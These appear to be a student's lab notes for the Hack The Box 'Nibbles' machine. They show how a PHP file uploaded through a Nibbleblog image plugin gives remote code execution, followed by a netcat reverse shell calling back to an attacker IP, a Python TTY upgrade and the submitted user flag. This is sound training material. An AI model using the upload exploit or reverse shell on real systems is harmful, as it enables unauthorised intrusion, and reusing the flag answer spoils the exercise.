### Overview
- We are able to log into the admin portal, so let's turn this access into a way of creating a reverse shell access to the web server.
- A Metasploit module may do the trick, but let's use other avenues to do this instead.
![[Screenshot_20241107_131847.png]]
- We can't make a new page, embed code, or upload files as it doesn't seem to like the path.
- Instead, let's check out the plugins page.
- Looking at it, let's use his plugin to upload a snippet of `PHP` code instead of an image.
```php
<?php system('id'); ?>
```
- We can save this code to a file.
- Then, click on the `Browse` button and upload it.
- We get a bunch of errors, but it seems like the file may have uploaded.
```shell-session
Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26

Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 27

Warning: imagecreatetruecolor(): Invalid image dimensions in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 117

Warning: imagecopyresampled() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 118

Warning: imagejpeg() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 43

Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 80
```
- The uploaded file is found under `/nibbleblog/content/private/plugins/my_image/`.
- We see `db.xml` and `image.php` with a recent last modified date, indicating successful upload.
- Now, we need to check to see if we have command execution on these files.
```shell-session
secmancer@htb[/htb]$ curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```
- We sure in fact do!
- Looks like we gained remote code execution on the Apache server running as `nibbler` user.
- We can modify the PHP file to obtain a reverse shell and upload it again.
- So, we can use resources like PayloadAllTheThings and HighOnCoffee for reverse shell techniques.
- Looks like aa Bash reverse shell one-liner will work best, so let's add that to the PHP script.
```shell-session
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
```
- We will add our `tun0` VPN IP address in the `<ATTACKING IP>` placeholder.
- Let's also add a port of our choice for `<LISTENING PORT>`.
- This way, we can catch the reverse shell on our `netcat` listener.
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
```
- We upload the file again and start a `netcat` listener in our terminal:
```shell-session
0xdf@htb[/htb]$ nc -lvnp 9443

listening on [any] 9443 ...
```
- `cURL` the image page again or browse to it in `Firefox` at http://nibbleblog/content/private/plugins/my_image/image.php to execute the reverse shell.
```shell-session
secmancer@htb[/htb]$ nc -lvnp 9443

listening on [any] 9443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 40106
/bin/sh: 0: can't access tty; job control turned off
$ id

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```
- We need to upgrade the shell to a fully interactive TTY for better usability.
- The initial shell lacks features like `su`, text editors, and tab-completion.
- We can refer to [this post](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) for methods to achieve this.
- So, let's use a `Python` one-liner to spawn a pseudo-terminal for improved functionality.
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
- Try the various techniques for upgrading to a full TTY and pick one that works best for you. Our first attempt fails as `Python2` seems to be missing from the system!
```shell-session
$ python -c 'import pty; pty.spawn("/bin/bash")'

/bin/sh: 3: python: not found

$ which python3

/usr/bin/python3
```
- We have `Python3` though, which works to get us to a friendlier shell by typing `python3 -c 'import pty; pty.spawn("/bin/bash")'`. 
- Browsing to `/home/nibbler`, we find the `user.txt` flag as well as a zip file `personal.zip`.
```shell-session
nibbler@Nibbles:/home/nibbler$ ls

ls
personal.zip  user.txt
```


### Questions
- Gain a foothold on the target and submit the user.txt flag
	- 79c03865431abf47b90ef24b9695e148